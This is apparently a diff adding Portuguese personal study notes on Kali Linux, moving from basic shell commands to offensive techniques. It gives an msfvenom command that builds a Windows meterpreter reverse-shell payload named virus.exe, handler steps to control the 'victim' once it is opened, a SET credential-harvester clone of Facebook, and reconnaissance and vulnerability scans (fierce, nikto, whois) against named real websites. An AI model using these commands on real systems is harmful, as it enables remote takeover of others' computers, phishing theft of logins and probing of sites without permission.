@@ -1,0 +1,93 @@
+man clear: mostra informações sobre o comando clear. 
+man: mostr informações sobre algum comando
+whatis clear: diz para o que serve o comando clear
+history: exibe um histórico dos comandos digitados
+ifconfig: mostra informações sobre a rede
+https://www.creadpag.com/2018/05/basico-comandos-en-kali-linux.html
+cd \"Nome de um diretório" : Acessa um diretório pelo terminal
+Sempre que um diretório tiver espaços no nome, basta colocar \ antes de cada espaço ex: Área\ de\ Trabalho
+ls: lista todo o conteúdo daquele diretório
+cd .. : Volta um nível de diretório, somente o comando cd volta tudo até o diretório principal
+mkdir : Cria uma pasta
+rmdir : Apaga uma pasta vazia
+rm -r: Apaga uma pasta que contém algum conteúdo dentro dela 
+Ctrl + C : Sempre que o diretório entrar em modo de texto, digitação esse comando sai do modo texto e volta para o último diretório em que ele estava
+
+						Resolver o problema de Wireless
+1- Configurar a VM pra modo bridge.
+2- Conferir se a placa de rede selecionada é a certa.
+3- Tentar o comando: service network-manager restart
+4- Se não resolver, tentar o comando: nmcli networking on
+5- Reiniciar o computador por via das dúvidas.
+
+								Spiware
+Criando um Spiware no terminal padrão do Linux: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=9999 > /root/Área\ de\ Trabalho/ virus.exe
+windows: sistema operacional que irá ser atacado
+meterpreter: Os scripts do Meterpreter são rotinas que podem ser executados a partir do intérprete e permite que você execute  ações específicas sobre o alvo e  são utilizadas para automatizar tarefas e agilizar atividades
+reverse_tcp:https://www.quora.com/What-is-reverse-TCP
+LOHOST: ip da máquina atacante
+LPORT: porta em que o vírus irá entrar
+/root/Área\ de\ Trabalho/ virus.exe : local onde irá ser criado o arquivo e nome do arquivo
+
+	Mantendo o payload em escuta
+1- Abrir o msfvenom
+2- user multi/handler
+3- set PAYLOAD windows/meterpreter/reverse_tcp
+4- set LHOST (ip do atacante, nesse caso 10.0.2.15)
+5- set LPORT (a mesma que foi usada na criação do payload, nesse caso 9999)
+6- exploit -j
+Depois basta usar os comandos para acessar o computador da vítima quando ela abrir o vírus.
+
+					
+						The Harvester
+Buscador que retorna informações públicas de funcionários de uma empresa, isso é importante pois quando se for fazer um ataque maior e já se tiver o email ou nome de algum funcionário o processo pode ficar mais rápido.
+
+						IPs de servidores
+whois: retorna informações referentes ao domínio que o usuário buscou. (whois jornalpanorama.net)
+host: retorna o IP de servidores que o site utiliza. Caso o site seja muito grande e possua subdomínios ele retorna o endereço do subdomínio, com isso basta usar host <endereço do subdomínio>. (host jornalpanorama.net)
+
+						Ataque por força bruta
+fierce -dns <endereço do site> (fierce -dns jornalpanorama.net)
+nikto: busca vunerabilidades nos sites. (nikto -h http://www.q-cursos.com -Tuning 9)
+
+						Encapsulamento de IP
+	Social Engineering toolkit -SET
+1- 1- Social Engeneering Attacks
+2- 2- Website Attack Vectors
+3- 3- Credencial Harvester Attack Method
+4- 2- Site Cloner
+5- Inserir o host, nesse caso o meu IP
+6- Site com a URL clonada (https://www.facebook.com)
+7- Basta abrir o site, inserir informações e os inputs serão salvos (abrir o navegador e inserir localhost)
+8- Quando o sniff for parado será gerado um arquivo, para acessálo será necessário o comando "nano" e passando o endenreço do arquivo salvo.
+
+						NMAP
+Ao digitar nmap (gateway padrão) ele busca informações de portas abertas dentro do roteador que eu passei como parâmetro (gateway padrão/ip do roteador).
+1- Abrir o terminal
+2- nmap 172.16.140.1 : retorna informações de portas abertas dentro do roteador.
+
+nmap -A 172.16.140.1 : retorna informações mais detalhadas do domínio, do roteador.
+nmap -v -A 172.16.140.1 : retorna informações técnicas a respeito do roteador.
+nmap -v -A 172.16.140 : escaneia toda a rede, quando passa o .1 no final você passa a especificar o dispositivo para ser escaneado.
+nmap -O 172.16.140.1 : mostra informações técnicas e o também o sistema operacional, porcentagem de uso...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
